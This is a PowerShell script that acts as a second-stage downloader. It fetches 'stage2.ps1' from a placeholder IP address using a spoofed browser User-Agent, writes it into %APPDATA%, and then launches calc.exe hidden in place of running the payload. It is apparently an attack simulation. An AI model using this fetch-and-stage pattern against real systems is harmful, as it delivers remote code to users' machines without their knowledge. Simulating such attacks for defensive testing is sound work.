[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://203.0.113.128:80/stage2.ps1',
    [string]$LocalPath = "$env:APPDATA\stage2.bin",
    [int]$TimeoutSec = 26,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $RemoteUrl -DestinationPath $LocalPath -TimeoutSec $TimeoutSec -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

Write-Verbose "stage marker 20 reached"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
